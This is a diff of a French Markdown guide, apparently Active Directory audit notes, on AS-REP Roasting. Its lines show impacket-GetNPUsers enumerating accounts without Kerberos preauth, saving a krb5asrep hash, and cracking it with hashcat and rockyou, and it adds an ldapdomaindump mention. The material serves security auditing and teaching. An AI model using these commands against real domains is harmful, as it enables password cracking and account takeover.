@@ -140,7 +140,7 @@ La vulnérabilité **AS-REP Roasting** consite à récupérer un ticket TGT ou G
 
 <br>
 
-### Impacket 
+__Impacket__
 
 Fichier contenant les noms d'utilisateurs trouvés depuis PingCastle avec la préauth Kerberos désactivée
 ```sh
@@ -159,7 +159,7 @@ impacket-GetNPUsers TSSR-CYBER.FR/KATRINA_RUTLEDGE -no-pass
 
 Ajouter le hash dans un fichier
 ```sh
-printf '%s\n' '$krb5asrep$23$COLETTE_MCKEE@TSSR-CYBER.FR:<hash>' > COLETTEHASH.txt 
+printf '%s' '$krb5asrep$23$COLETTE_MCKEE@TSSR-CYBER.FR:<hash>' > COLETTEHASH.txt 
 ```
 
 <br>
@@ -210,6 +210,9 @@ sudo hashcat -m 18200 -a 0 berniepatehash.txt /usr/share/wordlists/rockyou.txt -
 
 
 ## __DUMPER LES OBJETS LDAP__
+
+> Outils : ldapdomaindum
+
 
 Les informations collectées sont similaires à Ping Castle, mais l'outils est rapide et peut toujours être utile lors d'un Audit AD.
 
